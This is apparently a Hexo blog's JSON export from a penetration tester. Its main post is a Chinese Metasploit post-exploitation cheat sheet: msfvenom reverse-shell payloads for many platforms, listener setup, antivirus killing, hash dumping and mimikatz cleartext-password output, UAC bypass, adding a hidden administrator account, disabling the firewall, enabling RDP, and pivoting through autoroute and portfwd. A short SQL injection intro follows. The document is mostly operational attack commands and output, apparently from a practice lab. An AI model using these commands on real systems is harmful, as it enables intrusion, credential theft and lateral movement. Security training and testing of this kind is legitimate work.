{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"关于","date":"2020-10-02T05:23:57.095Z","updated":"2020-10-02T05:23:57.095Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"热爱web安全，擅长渗透测试、漏洞挖掘、内网渗透。 1234567891011121314151617181920212223242526272829303132&#123; name: &#x27;cofess&#x27; age: 29, gender: &#x27;男&#x27;, profession: &#x27;Web Developer &amp; Designer&#x27;, experience: &#x27;5年&#x27;, address: &#x27;广东省深圳市&#x27;, education: &#x27;本科&#x27;, github: &#x27;https://github.com/cofess&#x27;, blog: &#x27;http://blog.cofess.com&#x27;, email: &#x27;cofess@foxmail.com&#x27;, description: &#x27;热爱web安全，擅长渗透测试、漏洞挖掘、内网渗透。&#x27;, skills: [ [&#x27;Html&#x27;, &#x27;Javascript&#x27;, &#x27;jQuery&#x27;, &#x27;CSS&#x27;, &#x27;ES6&#x27;, &#x27;Node&#x27;], [&#x27;Webpack&#x27;, &#x27;Gulp&#x27;], [&#x27;Less&#x27;,&#x27;Sass&#x27;], [&#x27;Git&#x27;, &#x27;SVN&#x27;], [&#x27;Vue&#x27;], [&#x27;Bootstrap&#x27;, &#x27;SUI Mobile&#x27;, &#x27;light7&#x27;], [&#x27;WordPress&#x27;, &#x27;OpenCart&#x27;], [&#x27;平面设计&#x27;] ], devTools: [ [&#x27;Sublime Text&#x27;, &#x27;Visual Studio Code&#x27;, &#x27;Notepad++&#x27;], [&#x27;Chrome DevTools&#x27;, &#x27;Fiddler&#x27;], [&#x27;SourceTree&#x27;, &#x27;TortoiseSVN&#x27;], [&#x27;SwitchHosts&#x27;], [&#x27;Navicat&#x27;, &#x27;XAMPP&#x27;], ] &#125;"},{"title":"书单","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"books/index.html","permalink":"http://example.com/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"repository/index.html","permalink":"http://example.com/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"内网学习--Metasploit使用","slug":"内网学习--Metasploit使用","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-02T03:56:11.384Z","comments":true,"path":"2020/08/22/内网学习--Metasploit使用/","link":"","permalink":"http://example.com/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Metasploit使用基础常用命令12345background #将当前会话放置后台getuid # 查看权限shell #进入目标机cmd shellsessions #sessions –h 查看帮助sessions -i &lt;ID值&gt; #进入会话 -k 杀死会话 将回话保存到后台 12345meterpreter &gt; background[*] Backgrounding session 1...切换到会话1msf5 exploit(multi&#x2F;handler) &gt; sessions -i 1[*] Starting interaction with 1... 查看会话 12345678msf5 &gt; sessions -lActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x86&#x2F;windows NT AUTHORITY\\SYSTEM @ STU1 172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6) 信息收集获取目标主机上的软件安装信息 1run post&#x2F;windows&#x2F;gather&#x2F;enum_applications 关闭杀毒软件 1run post&#x2F;windows&#x2F;manage&#x2F;killav 判断是否是虚拟机 123456run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm[*] Checking if STU1 is a Virtual Machine .....[+] This is a VMware Virtual Machine 查看补丁信息 1234567run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #补丁信息meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches[*] Patch list saved to &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200906182724_default_172.20.10.6_enum_patches_447671.txt[*] KB2534111 applied[*] KB2999226 applied[*] KB976902 applied 查找域控制器 12345run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #查找域控meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_domain[+] FOUND Domain: god[+] FOUND Domain Controller: owa (IP: 192.168.52.138) 代理与端口设置端口转发1portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口 设置sockets5代理搜索一下可用代理 1234567891011msf5 &gt; search socksMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary&#x2F;scanner&#x2F;http&#x2F;sockso_traversal 2012-03-14 normal No Sockso Music Host Server 1.5 Directory Traversal 1 auxiliary&#x2F;server&#x2F;socks4a normal No Socks4a Proxy Server 2 auxiliary&#x2F;server&#x2F;socks5 normal No Socks5 Proxy Server 3 auxiliary&#x2F;server&#x2F;socks_unc normal No SOCKS Proxy UNC Path Redirection 设置代理 12345678910111213141516171819202122232425262728msf5 &gt; use auxiliary&#x2F;server&#x2F;socks5msf5 auxiliary(server&#x2F;socks5) &gt; show optionsModule options (auxiliary&#x2F;server&#x2F;socks5): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Proxy password for SOCKS5 listener SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on USERNAME no Proxy username for SOCKS5 listenerAuxiliary action: Name Description ---- ----------- Proxymsf5 auxiliary(server&#x2F;socks5) &gt; set SRVHOST 127.0.0.1SRVHOST &#x3D;&gt; 127.0.0.1msf5 auxiliary(server&#x2F;socks5) &gt; set SRVPORT 5555SRVPORT &#x3D;&gt; 5555msf5 auxiliary(server&#x2F;socks5) &gt; run[*] Auxiliary module running as background job 0.msf5 auxiliary(server&#x2F;socks5) &gt;[*] Starting the socks5 proxy server 然后也可以直接使用一下命令 12set proxies socks5:127.0.0.1:8990 设置代理setg ReverseAllowProxy true 允许反向代理 获取内网网段 1234567meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 169.254.0.0&#x2F;255.255.0.0Local subnet: 172.20.10.0&#x2F;255.255.255.240Local subnet: 192.168.52.0&#x2F;255.255.255.0 添加路由 1meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24 查看是否添加成功 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 198.168.52.0 255.255.255.0 Session 1 ARP扫描内网主机 获取目标shell常见shell生成1234567891011121314151617181920212223242526Linux：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exePHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl PHP-Shell 生成一句话木马 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php 12345➜ Desktop msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.109 LPORT&#x3D;1234 R &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1114 bytes msfconsole 监听端口 123456789msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IPlhost &#x3D;&gt; 192.168.0.108msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口msf5 exploit(multi&#x2F;handler) &gt; run[-] Handler failed to bind to 192.168.0.108:1234:- -[*] Started reverse TCP handler on 0.0.0.0:1234 EXE-木马 生成木马 1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 -f exe &gt; hacker.exe msfconsole监听端口 123456msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 攻击IPmsf5 exploit(multi&#x2F;handler) &gt; set LPORT 监听端口msf5 exploit(multi&#x2F;handler) &gt; exploit 升级正常的Shell到Meterpreter通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell, 因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions Command 可以帮助我们实现从Shell 到Meterpreter提升。 12345678910msf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. 使用一下命名进行切换 1sessions -u sessionid 添加去往”内网网段”的路由 MSF 路由添加帮助查询命令 12345678910111213meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage: run autoroute [-r] -s subnet -n netmask[*] Examples:[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to 10.10.10.1&#x2F;255.255.255.0[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0[*] run autoroute -s 10.10.10.1&#x2F;24 # CIDR notation is also okay[*] run autoroute -p # Print active routing table[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes[-] Deprecation warning: This script has been replaced by the post&#x2F;multi&#x2F;manage&#x2F;autoroute module 获取目标内网地址段 具体获取被攻击目标内网地址网段的命令 12345meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 172.17.0.0&#x2F;255.255.0.0 由上可以获知，目标内网网段是“172.17.0.0./24” 添加去往目标网段的转发路由 在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法 1234567meterpreter &gt; run autoroute -s 172.17.0.0&#x2F;24[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Adding a route to 172.17.0.0&#x2F;255.255.255.0...[+] Added route to 172.17.0.0&#x2F;255.255.255.0 via 10.48.8.234[*] Use the -p option to list all active routes 添加网路由后，我们来查看下路由的添加情况如何 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 172.17.0.0 255.255.255.0 Session 3 将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。 删除路由 1meterpreter &gt; run autoroute -d -s 172.20.10.0 内网主机发现进去内网之后，我们使用相关模块进行主机发现。 TCP扫描12345678910111213msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcpmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show optionsmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10threads &#x3D;&gt; 10msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100RHOSTS &#x3D;&gt; 172.18.0.2-100msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022PORTS &#x3D;&gt; 3306,8022msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit[+] 172.18.0.3: - 172.18.0.3:3306 - TCP OPEN[+] 172.18.0.2: - 172.18.0.2:8022 - TCP OPEN[*] 172.18.0.2-100: - Scanned 10 of 99 hosts (10% complete) ARP扫描1use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner 解决中文乱码问题1chcp 65001 或者将终端临时设置为GBK系列编码即可 Hash与明文密码获取获取目标机系统用户Hash 12345678910111213141516171819run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against STU1[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[*] No users with password hints on this system[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd::: 获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理) 1meterpreter &gt; upload mimikatz.exe 目标位置 mimikatz的使用 123456789101112131415161718192021222324252627282930313233343536373839404142c:\\\\mimikatz.exec:\\&gt;mimikatz.exemimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## &#x2F; \\ ## &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com ) ## \\ &#x2F; ## &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com ***&#x2F;mimikatz # privilege::debugPrivilege &#39;20&#39; OKmimikatz # sekurlsa::logonPasswordsAuthentication Id : 0 ; 2499588 (00000000:00262404)Session : Interactive from 1User Name : AdministratorDomain : GODLogon Server : OWALogon Time : 2020&#x2F;9&#x2F;3 13:38:09SID : S-1-5-21-2952760202-1353902439-2381784089-500 msv : [00000003] Primary * Username : Administrator * Domain : GOD * LM : 3333deaae325ebb705026d3fb1a43796 * NTLM : 7d0e302e0cbd94d9353ac4a51d7c39c1 * SHA1 : d4f206f0d8303230185b2ff2fedb7d40a62effa5 tspkg : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. wdigest : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. kerberos : * Username : Administrator * Domain : GOD.ORG * Password : 1999118gxaGXA. ssp : credman : Metasploit Portfwd（端口转发/重定向）在活动的Meterpreter会话中，键入portfwd -h将显示命令的各种选项和参数。 123456789meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &gt;opt&gt; 要监听的本地主机（可选）。 -h 帮助横幅。 -l &gt;opt&gt; 要监听的本地端口。 -p &gt;opt&gt; 要连接的远程端口 -r &gt;opt&gt; 要连接的远程主机meterpreter &gt; Options：选项 123456789-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。-h：显示以上信息。-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。-p：TCP连接将转发到的端口。-r：连接被中继到的IP地址（目标）。 Arguments：参数 1234567Add：该参数用于创建转发。Delete：这将从我们的转发端口列表中删除先前的条目。List：这将列出当前转发的所有端口。Flush：这将删除我们的转发列表中的所有端口。 例子： Add参数 1meterpreter &gt; portfwd add –l 3389 –p 3389 –r [target host] 1234add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。-p 3389是我们的定向主机上的目标端口。-r [target host]是我们的目标系统的IP或主机名。 List参数 12345meterpreter &gt; portfwd list0: 0.0.0.0:3389 -&gt; 172.16.194.191:33891: 0.0.0.0:1337 -&gt; 172.16.194.191:13372: 0.0.0.0:2222 -&gt; 172.16.194.191:22223 total local port forwards. Windows权限提升 绕过UAC bypassuac 12345678910111213141516171819202122msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac或者msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionmsf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use if UAC is turned off (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windows x86msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1set target 1 #设置目标系统类型，1是64位，0是32位 12use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 RunAs绕过 创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。 123456789101112131415161718192021msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;askmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;ask): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME no File name on disk PATH no Location on disk, %TEMP% used if not set SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windowsmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; Windows渗透cmd与3389 监听木马 1234567891011121314msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001[-] Unknown command: chcp.msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3LHOST &#x3D;&gt; 172.20.10.3msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234LPORT &#x3D;&gt; 1234msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 172.20.10.3:1234[*] Sending stage (176195 bytes) to 172.20.10.6[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800 获取当前权限以及提权 123456meterpreter &gt; getuidServer username: GOD\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限 添加用户并加入管理员组 12345678C:\\Windows\\system32&gt;net user steady111 125219gxaGXA &#x2F;addnet user steady111 125219gxaGXA &#x2F;add命令成功完成。C:\\Windows\\system32&gt;net localgroup administrators steady111 &#x2F;addnet localgroup administrators steady111 &#x2F;add命令成功完成。 开启关闭防火墙 windows2003之前 1234开启防火墙：netsh firewall set opmode mode&#x3D;enable关闭防火墙：netsh firewall set opmode mode&#x3D;disable windows2003之后 1netsh advfirewall set allprofiles state off 开启3389 123456REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; 2&gt;&amp;1Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f&quot; 2&gt;&amp;1 检查3389是否开放 123456REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnectionsHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server1表示关闭0表示开放fDenyTSConnections REG_DWORD 0x1 查看远程桌面服务所在的端口 12REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumberHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp MSF与3389123run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662 #将3389端口转发到6662 12portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口run getgui -f 6661 –e","categories":[],"tags":[{"name":"内网","slug":"内网","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91/"}]},{"title":"SQL--SQL注入漏洞","slug":"SQL注入漏洞","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-02T04:51:30.965Z","comments":true,"path":"2020/08/22/SQL注入漏洞/","link":"","permalink":"http://example.com/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞原理用户将恶意的sql语句输入到参数重，后台执行sql语句，从而使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。 基础知识MySQL 5.0以上版本 数据库 information_schema 系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。 表 SCHEMATA 储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等 TABLES 储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等 COLUMNS 储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566mysql&gt; use information_schema;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| TABLES || SCHEMATA || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS |mysql&gt; desc TABLES;+-----------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-----------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(255) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | |+-----------------+---------------------+------+-----+---------+-------+mysql&gt; desc COLUMNS;+--------------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || COLUMN_NAME | varchar(64) | NO | | | || ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 | || COLUMN_DEFAULT | longtext | YES | | NULL | || IS_NULLABLE | varchar(3) | NO | | | || DATA_TYPE | varchar(64) | NO | | | || CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL | || CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL | || NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL | || NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL | || DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL | || CHARACTER_SET_NAME | varchar(32) | YES | | NULL | || COLLATION_NAME | varchar(32) | YES | | NULL | || COLUMN_TYPE | longtext | NO | | NULL | || COLUMN_KEY | varchar(3) | NO | | | || EXTRA | varchar(30) | NO | | | || PRIVILEGES | varchar(80) | NO | | | || COLUMN_COMMENT | varchar(1024) | NO | | | || GENERATION_EXPRESSION | longtext | NO | | NULL | |+--------------------------+---------------------+------+-----+---------+-------+21 rows in set (0.00 sec) 总结 